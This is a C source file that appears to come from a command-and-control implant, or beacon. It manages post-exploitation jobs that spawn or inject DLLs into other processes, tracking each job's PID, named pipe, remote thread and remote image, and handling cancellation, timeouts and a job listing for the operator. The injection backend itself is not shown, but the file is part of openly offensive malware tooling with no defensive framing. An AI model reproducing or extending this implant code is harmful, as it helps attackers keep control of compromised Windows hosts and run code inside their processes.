#include "postex_internal.h"

const CHAR* PostExSubcmdName(UINT32 subcmd)
{
    switch (subcmd) {
    case POSTEX_SUBCMD_SPAWN_DLL:         return "spawn-dll";
    case POSTEX_SUBCMD_INJECT_DLL:        return "inject-dll";
    default:                              return "postex";
    }
}

const CHAR* PostExCancelReasonName(UINT32 reason)
{
    switch (reason) {
    case POSTEX_CANCEL_REASON_TIMEOUT: return "timeout";
    case POSTEX_CANCEL_REASON_IDLE:    return "idle-timeout";
    case POSTEX_CANCEL_REASON_USER:
    default:                           return "cancelled";
    }
}

BOOL PostExProcessExited(PostExJob* job)
{
    return job && job->process &&
           WaitForSingleObject(job->process, 0) == WAIT_OBJECT_0;
}

VOID PostExCloseJob(PostExJob* job, BOOL kill_process)
{
    if (!job) return;
    if (job->pipe && job->pipe != INVALID_HANDLE_VALUE) {
        CloseHandle(job->pipe);
        job->pipe = INVALID_HANDLE_VALUE;
    }
    PostExBackendCleanupJob(job, kill_process);
    SecureZeroMemory(job, sizeof(*job));
    HeapFree(GetProcessHeap(), 0, job);
}

PostExJob* PostExFindLocked(PostExManager* pm, UINT32 job_id)
{
    PostExJob* cur;

    for (cur = pm->jobs; cur; cur = cur->next) {
        if (cur->job_id == job_id) return cur;
    }
    return NULL;
}

PostExJob* PostExDetachLocked(PostExManager* pm, UINT32 job_id)
{
    PostExJob** pp;

    pp = &pm->jobs;
    while (*pp) {
        PostExJob* cur = *pp;
        if (cur->job_id == job_id) {
            *pp = cur->next;
            cur->next = NULL;
            return cur;
        }
        pp = &cur->next;
    }
    return NULL;
}

SIZE_T PostExJobCountLocked(PostExManager* pm)
{
    SIZE_T count = 0;
    PostExJob* cur;

    for (cur = pm->jobs; cur; cur = cur->next) {
        ++count;
    }
    return count;
}

BOOL PostExRequestCancelLocked(PostExJob* job, UINT32 reason,
                               ULONGLONG now, BOOL* signaled)
{
    BOOL newly_requested = FALSE;
    BOOL signal_ok;

    if (signaled) *signaled = FALSE;
    if (!job) return FALSE;

    if (!job->cancel_requested) {
        job->cancel_requested = TRUE;
        job->cancel_reason = reason ? reason : POSTEX_CANCEL_REASON_USER;
        job->cancel_requested_tick = now ? now : GetTickCount64();
        newly_requested = TRUE;
    }

    signal_ok = PostExBackendCancelJob(job, job->cancel_reason);
    if (signaled) *signaled = signal_ok;
    return newly_requested;
}

VOID PostExTouchJobActivityLocked(PostExJob* job, ULONGLONG now)
{
    if (!job) return;
    job->last_activity_tick = now ? now : GetTickCount64();
}

BOOL PostExCanStartJob(struct BeaconContext* ctx, UINT32 task_id,
                       CHAR* err, SIZE_T err_size)
{
    BOOL ok = TRUE;

    if (!ctx) {
        return PostExSetError(err, err_size, "invalid postex context");
    }

    EnterCriticalSection(&ctx->postex.lock);
    if (PostExFindLocked(&ctx->postex, task_id)) {
        PostExSetError(err, err_size, "postex job id already exists");
        ok = FALSE;
    } else if (PostExJobCountLocked(&ctx->postex) >= POSTEX_MAX_JOBS) {
        if (err && err_size) {
            _snprintf_s(err, err_size, _TRUNCATE,
                        "postex job limit reached (%lu)",
                        (unsigned long)POSTEX_MAX_JOBS);
        }
        ok = FALSE;
    }
    LeaveCriticalSection(&ctx->postex.lock);

    return ok;
}

VOID PostExCloseStartedBackend(const PostExStartRequest* req,
                               HANDLE pipe,
                               PostExStartResult* result)
{
    if (pipe && pipe != INVALID_HANDLE_VALUE) {
        CloseHandle(pipe);
    }
    PostExBackendCleanupStartResult(req, result);
}

ByteBuf PostExRegisterStartedJob(struct BeaconContext* ctx,
                                 const PostExStartRequest* req,
                                 HANDLE pipe,
                                 PostExStartResult* result)
{
    const CHAR* default_description;
    PostExJob* job;
    ByteBuf out;

    if (!ctx || !req || !result) return BbFromText("invalid postex job");

    job = (PostExJob*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*job));
    if (!job) {
        PostExCloseStartedBackend(req, pipe, result);
        return BbFromText("postex job allocation failed");
    }

    default_description = req->subcmd == POSTEX_SUBCMD_SPAWN_DLL ?
                          "postex-spawn-dll" : "postex-inject-dll";
    job->job_id = req->task_id;
    job->subcmd = req->subcmd;
    job->pid = result->pid;
    job->pipe = pipe;
    job->process = result->process;
    job->owns_process = result->owns_process;
    job->backend_kind = result->backend_kind;
    job->remote_thread = result->remote_thread;
    job->remote_image = result->remote_image;
    job->remote_config = result->remote_config;
    job->started_at = GetUnixTimestamp();
    job->started_tick = GetTickCount64();
    job->last_activity_tick = job->started_tick;
    job->max_runtime_ms = req->max_runtime_ms;
    job->idle_timeout_ms = req->idle_timeout_ms;
    strcpy_s(job->pipe_name, sizeof(job->pipe_name), req->pipe_name);
    strcpy_s(job->description, sizeof(job->description),
             req->description[0] ? req->description : default_description);
    PostExStartResultInit(result);

    EnterCriticalSection(&ctx->postex.lock);
    if (PostExFindLocked(&ctx->postex, req->task_id)) {
        LeaveCriticalSection(&ctx->postex.lock);
        PostExCloseJob(job, TRUE);
        return BbFromText("postex job id already exists");
    }
    if (PostExJobCountLocked(&ctx->postex) >= POSTEX_MAX_JOBS) {
        LeaveCriticalSection(&ctx->postex.lock);
        PostExCloseJob(job, TRUE);
        return BbFromText("postex job limit reached");
    }
    job->next = ctx->postex.jobs;
    ctx->postex.jobs = job;
    LeaveCriticalSection(&ctx->postex.lock);

    BbInit(&out);
    if (req->subcmd == POSTEX_SUBCMD_SPAWN_DLL) {
        BbPrintf(&out, "postex spawn job %lu started: %s pid:%lu",
                 (unsigned long)req->task_id,
                 job->description,
                 (unsigned long)job->pid);
    } else {
        BbPrintf(&out, "postex inject job %lu started: %s pid:%lu",
                 (unsigned long)req->task_id,
                 job->description,
                 (unsigned long)job->pid);
    }
    return out;
}

BOOL PostExCancelJob(struct BeaconContext* ctx, UINT32 job_id, ByteBuf* out)
{
    PostExJob* job;
    CHAR description[64] = { 0 };
    UINT32 subcmd = 0;
    BOOL newly_requested = FALSE;
    BOOL signaled = FALSE;

    if (!ctx || !out || job_id == 0) return FALSE;

    EnterCriticalSection(&ctx->postex.lock);
    job = PostExFindLocked(&ctx->postex, job_id);
    if (job) {
        strcpy_s(description, sizeof(description), job->description);
        subcmd = job->subcmd;
        newly_requested = PostExRequestCancelLocked(
            job, POSTEX_CANCEL_REASON_USER, GetTickCount64(), &signaled);
    }
    LeaveCriticalSection(&ctx->postex.lock);

    if (!job) return FALSE;

    BbPrintf(out, "postex job %lu (%s) %s%s: %s",
             (unsigned long)job_id,
             PostExSubcmdName(subcmd),
             newly_requested ? "cancel requested" : "cancel already requested",
             signaled ? "" : " (signal pending)",
             description[0] ? description : "postex");
    return TRUE;
}

VOID PostExAppendJobs(PostExManager* pm, ByteBuf* out, SIZE_T* count, ULONGLONG now)
{
    PostExJob* cur;

    if (!pm || !out || !count) return;

    EnterCriticalSection(&pm->lock);
    for (cur = pm->jobs; cur; cur = cur->next) {
        ULONGLONG age = now >= cur->started_at ? now - cur->started_at : 0;
        CHAR ref[32];
        CHAR detail[96];

        if (cur->pid) {
            _snprintf_s(ref, sizeof(ref), _TRUNCATE,
                        "pid:%lu", (unsigned long)cur->pid);
        } else {
            strcpy_s(ref, sizeof(ref), "pipe");
        }
        _snprintf_s(detail, sizeof(detail), _TRUNCATE,
                    "%s",
                    cur->description[0] ? cur->description : "-");

        BbPrintf(out, "%-10lu  %-10s  %-10s  %-9I64u  %-9lu  %-10s  %-18s  %s\n",
                 (unsigned long)cur->job_id,
                 "postex",
                 cur->cancel_requested ? "cancelling" : "running",
                 (unsigned __int64)age,
                 (unsigned long)BEACON_COMMAND_POSTEX_EVENT,
                 PostExSubcmdName(cur->subcmd),
                 ref,
                 detail);
        ++(*count);
    }
    LeaveCriticalSection(&pm->lock);
}
